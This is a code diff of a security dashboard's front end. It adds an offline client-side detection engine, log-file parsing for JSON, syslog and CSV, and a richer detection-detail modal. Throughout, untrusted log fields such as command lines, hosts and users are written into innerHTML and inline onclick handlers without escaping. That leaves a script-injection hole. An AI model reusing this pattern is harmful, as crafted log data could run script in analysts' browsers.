+      // Multi-format parser — supports JSON array/object, Syslog RFC3164/RFC5424, CEF
       const events = _parseLogInput(raw, fmt);
       if (!events.length) return _showToast('No parseable events found. Check format selection.', 'warning');
 
-      const r = await _api('POST', '/ingest', { events, context: { format: fmt } });
+      let r;
+      try {
+        // Try backend first
+        r = await _api('POST', '/ingest', { events, context: { format: fmt } });
+      } catch(apiErr) {
+        // Fallback: run full client-side detection engine (CSDE)
+        console.warn('[RAYKAN] Backend unavailable — using client-side detection engine:', apiErr.message);
+        r = CSDE.analyzeEvents(events);
+        _showToast(`[Offline Mode] Analyzed ${events.length} events — ${r.detections.length} detections found`, 'info');
+      }
 
-      // FIX: normalizeDetections — guaranteed iterable array regardless of response shape
+      // Guaranteed iterable array regardless of response shape
       const dets  = normalizeDetections(r.detections);
       const tl    = normalizeDetections(r.timeline);
       const chs   = normalizeDetections(r.chains);
@@ -1246,24 +1826,36 @@
       S.timeline    = [...tl,    ...S.timeline];
       S.chains      = [...chs,   ...S.chains];
       S.anomalies   = [...anoms, ...S.anomalies];
-      S.riskScore   = r.riskScore || S.riskScore;
+      S.riskScore   = Math.max(r.riskScore || 0, S.riskScore);
+      S.sessionId   = r.sessionId || S.sessionId;
       S.lastUpdated = new Date();
       _updateStats(r);
-      _showToast(`Analyzed ${events.length} events — ${dets.length} detections`, 'success');
+      if (dets.length) {
+        _showToast(`✓ ${events.length} events → ${dets.length} detection(s), ${chs.length} chain(s) | Risk: ${r.riskScore}`, 'success');
+      }
       if (res) res.innerHTML = _ingestSummaryCard(r);
+      // Auto-navigate to detections if any found
+      if (dets.length) setTimeout(() => _setTab('detections'), 800);
     } catch(e) {
-      if (res) res.innerHTML = `<div style="color:#ef4444;padding:20px;">${e.message}</div>`;
+      if (res) res.innerHTML = `<div style="color:#ef4444;padding:20px;border-radius:8px;background:rgba(239,68,68,0.08);">
+        <div style="font-weight:700;margin-bottom:6px;">⚠ Analysis Error</div>
+        <div style="font-size:12px;">${e.message}</div>
+      </div>`;
       _showToast('Ingest failed: ' + e.message, 'error');
     }
   }
 
   function _ingestSummaryCard(r) {
-    // FIX: normalizeDetections before .length access — response shape may vary
+    // normalizeDetections before .length access — response shape may vary
     const detsLen  = normalizeDetections(r.detections).length;
     const anomsLen = normalizeDetections(r.anomalies).length;
     const chsLen   = normalizeDetections(r.chains).length;
+    const isOffline = r.engine === 'CSDE-offline';
     return `<div class="rk-card" style="padding:16px;">
-  <div style="font-size:13px;font-weight:600;color:#34d399;margin-bottom:12px;">✓ Analysis Complete</div>
+  <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;">
+    <div style="font-size:13px;font-weight:600;color:#34d399;">✓ Analysis Complete</div>
+    ${isOffline ? `<span style="font-size:10px;padding:2px 8px;border-radius:10px;background:rgba(96,165,250,0.12);color:#60a5fa;font-weight:700;">OFFLINE MODE</span>` : ''}
+  </div>
   <div class="rk-grid-3" style="gap:8px;">
     ${_miniStat('Events',      r.processed   || 0, '#60a5fa')}
     ${_miniStat('Detections',  detsLen,             '#ef4444')}
@@ -1274,7 +1866,8 @@
   </div>
   <div style="margin-top:12px;display:flex;gap:8px;">
     <button class="rk-btn rk-btn-primary" onclick="RAYKAN_UI._setTab('detections')" style="font-size:11px;">View Detections →</button>
-    <button class="rk-btn rk-btn-ghost"   onclick="RAYKAN_UI._setTab('timeline')"  style="font-size:11px;">View Timeline →</button>
+    <button class="rk-btn rk-btn-ghost"   onclick="RAYKAN_UI._setTab('chains')"     style="font-size:11px;">Attack Chains →</button>
+    <button class="rk-btn rk-btn-ghost"   onclick="RAYKAN_UI._setTab('timeline')"  style="font-size:11px;">Timeline →</button>
   </div>
 </div>`;
   }
@@ -1312,43 +1905,87 @@
       if (msg) msg.textContent = 'Parsing events…';
 
       let events;
-      if (file.name.endsWith('.json')) {
-        try { events = JSON.parse(text); if (!Array.isArray(events)) events = [events]; }
-        catch { events = text.split('\n').filter(Boolean).map(l => { try { return JSON.parse(l); } catch { return { raw: l }; } }); }
+      const ext = file.name.split('.').pop().toLowerCase();
+      if (ext === 'json' || ext === 'txt') {
+        // Try JSON parse first (handles .json.txt files too)
+        try {
+          events = JSON.parse(text);
+          if (!Array.isArray(events)) events = [events];
+        } catch {
+          // Try JSON Lines (newline-delimited)
+          const lines = text.split('\n').filter(Boolean);
+          const jsonLines = lines.filter(l => l.trim().startsWith('{') || l.trim().startsWith('['));
+          if (jsonLines.length) {
+            events = jsonLines.map(l => { try { return JSON.parse(l); } catch { return { raw: l }; } });
+          } else {
+            // Syslog / CEF / plain text lines
+            events = lines.map(l => _parseSyslogLine(l));
+          }
+        }
+      } else if (ext === 'log' || ext === 'syslog') {
+        events = text.split('\n').filter(Boolean).map(l => _parseSyslogLine(l));
+      } else if (ext === 'csv') {
+        // Parse CSV headers
+        const lines = text.split('\n').filter(Boolean);
+        const headers = lines[0].split(',').map(h => h.trim().replace(/^"|"$/g, ''));
+        events = lines.slice(1).map(line => {
+          const vals = line.split(',');
+          const ev = {};
+          headers.forEach((h, i) => { ev[h] = (vals[i] || '').replace(/^"|"$/g, '').trim(); });
+          return ev;
+        });
       } else {
         events = text.split('\n').filter(Boolean).map(l => ({ raw: l, source: 'file' }));
       }
 
-      if (bar) bar.style.width = '60%';
-      if (msg) msg.textContent = `Analyzing ${events.length} events…`;
+      if (!events || !events.length) {
+        if (msg) msg.textContent = '✗ No parseable events found in file';
+        _showToast('No events found in file', 'warning');
+        return;
+      }
 
-      const r = await _api('POST', '/ingest', { events: events.slice(0, 5000), context: { source: 'file', fileName: file.name } });
+      if (bar) bar.style.width = '60%';
+      if (msg) msg.textContent = `Analyzing ${events.length} event(s)…`;
+
+      let r;
+      try {
+        // Try backend API first
+        r = await _api('POST', '/ingest', { events: events.slice(0, 5000), context: { source: 'file', fileName: file.name } });
+      } catch(apiErr) {
+        // Fallback: client-side detection engine (CSDE)
+        console.warn('[RAYKAN] Backend unavailable — using CSDE for file:', apiErr.message);
+        r = CSDE.analyzeEvents(events.slice(0, 5000));
+      }
+
       if (bar) bar.style.width = '100%';
 
-      // FIX: normalizeDetections — guaranteed iterable array regardless of response shape
       const dets  = normalizeDetections(r.detections);
       const tl    = normalizeDetections(r.timeline);
       const chs   = normalizeDetections(r.chains);
       const anoms = normalizeDetections(r.anomalies);
 
-      if (msg) msg.textContent = `✓ Done — ${dets.length} detections`;
+      if (msg) msg.textContent = `✓ Done — ${dets.length} detection(s)${r.engine === 'CSDE-offline' ? ' [Offline]' : ''}`;
 
       S.detections  = [...dets,  ...S.detections];
       S.timeline    = [...tl,    ...S.timeline];
       S.chains      = [...chs,   ...S.chains];
       S.anomalies   = [...anoms, ...S.anomalies];
-      S.riskScore   = r.riskScore || S.riskScore;
+      S.riskScore   = Math.max(r.riskScore || 0, S.riskScore);
+      S.sessionId   = r.sessionId || S.sessionId;
       S.lastUpdated = new Date();
       _updateStats(r);
 
       const res = document.getElementById('rk-ingest-result');
       if (res) res.innerHTML = _ingestSummaryCard(r);
-      _showToast(`${file.name}: ${dets.length} detections found`, 'success');
+      _showToast(`${file.name}: ${dets.length} detection(s)${r.engine === 'CSDE-offline' ? ' (offline engine)' : ''}`, dets.length ? 'success' : 'info');
+      // Auto-navigate to detections if any found
+      if (dets.length) setTimeout(() => _setTab('detections'), 800);
     } catch(e) {
       if (msg) msg.textContent = '✗ Error: ' + e.message;
       _showToast('Upload failed: ' + e.message, 'error');
     }
   }
+
 
   // ════════════════════════════════════════════════════════════════
   //  RENDERERS
@@ -1850,6 +2487,13 @@
   function _showDetDetail(id) {
     const det = S.detections.find(d => d.id === id) || S.detections[0];
     if (!det) return;
+    // Normalize MITRE field — CSDE uses det.mitre as object, backend may use array
+    const mitreItems = Array.isArray(det.mitre) ? det.mitre
+      : (det.mitre && typeof det.mitre === 'object' ? [det.mitre] : []);
+    const mitreText = mitreItems.length
+      ? mitreItems.map(t => `<span class="rk-tag" style="color:#a78bfa;">${t.id||t.technique||''} — ${t.name||''} <span style="color:#6b7280;">[${t.tactic||''}]</span></span>`).join('')
+      : (det.technique ? `<span class="rk-tag" style="color:#a78bfa;">${det.technique}</span>` : '');
+
     const overlay = document.createElement('div');
     overlay.className = 'rk-modal-overlay';
     overlay.onclick = (e) => { if (e.target === overlay) overlay.remove(); };
@@ -1860,37 +2504,57 @@
       ${_sevBadge(det.severity)}
       <span style="font-size:14px;font-weight:700;color:#e6edf3;">${det.ruleName||det.title||'Detection'}</span>
     </div>
-    <button onclick="this.closest('.rk-modal-overlay').remove()" style="
-      background:none;border:none;color:#6b7280;font-size:18px;cursor:pointer;padding:4px;">✕</button>
+    <button onclick="this.closest('.rk-modal-overlay').remove()" style="background:none;border:none;color:#6b7280;font-size:18px;cursor:pointer;padding:4px;">✕</button>
   </div>
   <div style="overflow-y:auto;padding:20px;flex:1;">
     <div class="rk-grid-2" style="margin-bottom:16px;">
       ${_detField('Host',       det.computer||det.host)}
       ${_detField('User',       det.user)}
+      ${_detField('Source IP',  det.srcIp||det.src_ip||'—')}
       ${_detField('Process',    det.process||det.processName)}
-      ${_detField('Risk Score', det.riskScore)}
+      ${_detField('Risk Score', det.riskScore ? det.riskScore+'/100' : '—')}
       ${_detField('Timestamp',  _fmt(det.timestamp))}
-      ${_detField('Confidence', det.confidence ? (det.confidence*100).toFixed(0)+'%' : '—')}
     </div>
+    ${det.narrative||det.description ? `<div style="margin-bottom:14px;padding:12px;background:rgba(96,165,250,0.06);border-left:3px solid #60a5fa;border-radius:0 6px 6px 0;">
+      <div style="font-size:10px;color:#60a5fa;font-weight:700;text-transform:uppercase;letter-spacing:.4px;margin-bottom:6px;">Analysis Narrative</div>
+      <div style="font-size:12px;color:#e6edf3;line-height:1.5;">${det.narrative||det.description}</div>
+    </div>` : ''}
     ${det.commandLine ? `<div style="margin-bottom:14px;">
       <div style="font-size:11px;color:#6b7280;font-weight:600;text-transform:uppercase;letter-spacing:.4px;margin-bottom:6px;">Command Line</div>
       <div class="rk-code" style="background:#0d1117;padding:12px;border-radius:6px;border:1px solid #21262d;font-size:11px;color:#34d399;word-break:break-all;">${det.commandLine}</div>
     </div>` : ''}
-    ${det.mitre?.techniques?.length ? `<div style="margin-bottom:14px;">
-      <div style="font-size:11px;color:#6b7280;font-weight:600;text-transform:uppercase;letter-spacing:.4px;margin-bottom:6px;">MITRE ATT&CK</div>
-      <div style="display:flex;gap:6px;flex-wrap:wrap;">
-        ${det.mitre.techniques.map(t => `<span class="rk-tag" style="color:#a78bfa;">${t.id||t} — ${t.name||''}</span>`).join('')}
+    ${mitreText ? `<div style="margin-bottom:14px;">
+      <div style="font-size:11px;color:#6b7280;font-weight:600;text-transform:uppercase;letter-spacing:.4px;margin-bottom:6px;">MITRE ATT&amp;CK</div>
+      <div style="display:flex;gap:6px;flex-wrap:wrap;">${mitreText}</div>
+    </div>` : ''}
+    <div style="margin-bottom:14px;">
+      <div style="font-size:11px;color:#6b7280;font-weight:600;text-transform:uppercase;letter-spacing:.4px;margin-bottom:6px;">Tags</div>
+      <div style="display:flex;gap:4px;flex-wrap:wrap;">
+        ${(det.tags||[]).map(t => `<span class="rk-tag">${t}</span>`).join('')||'<span class="rk-tag">—</span>'}
+        <span class="rk-tag" style="color:#4b5563;">ID: ${det.ruleId||det.id||'?'}</span>
+      </div>
+    </div>
+    ${det.evidence&&det.evidence.length ? `<div style="margin-bottom:14px;">
+      <div style="font-size:11px;color:#6b7280;font-weight:600;text-transform:uppercase;letter-spacing:.4px;margin-bottom:6px;">Evidence Events (${det.evidence.length})</div>
+      <div style="max-height:160px;overflow-y:auto;">
+        ${det.evidence.slice(0,5).map(ev => `<div class="rk-code" style="font-size:10px;padding:6px 10px;margin-bottom:4px;background:#0d1117;border-radius:4px;border:1px solid #21262d;color:#8b949e;">
+          EventID ${ev.EventID||ev.eventId||'?'} · ${ev.Computer||ev.computer||'?'} · ${ev.User||ev.user||'?'} ${ev.SourceIP||ev.srcIp?'from '+(ev.SourceIP||ev.srcIp):''}
+          ${ev.CommandLine||ev.commandLine?'<br/><span style="color:#34d399;">'+(ev.CommandLine||ev.commandLine)+'</span>':''}
+        </div>`).join('')}
       </div>
     </div>` : ''}
-    ${det.description ? `<div style="font-size:12px;color:#8b949e;">${det.description}</div>` : ''}
-    <div style="margin-top:14px;display:flex;gap:8px;">
+    <div style="margin-top:14px;display:flex;gap:8px;flex-wrap:wrap;">
       <button class="rk-btn rk-btn-ghost" style="font-size:11px;"
         onclick="RAYKAN_UI._invEntity('${det.computer||det.host||det.user||''}');this.closest('.rk-modal-overlay').remove()">
-        🕵️ Investigate Entity →
+        Investigate Entity
+      </button>
+      <button class="rk-btn rk-btn-ghost" style="font-size:11px;"
+        onclick="RAYKAN_UI._setTab('chains');this.closest('.rk-modal-overlay').remove()">
+        Attack Chains
       </button>
       <button class="rk-btn rk-btn-ghost" style="font-size:11px;"
         onclick="RAYKAN_UI._setTab('timeline');this.closest('.rk-modal-overlay').remove()">
-        ⏱ View Timeline →
+        Timeline
       </button>
     </div>
   </div>
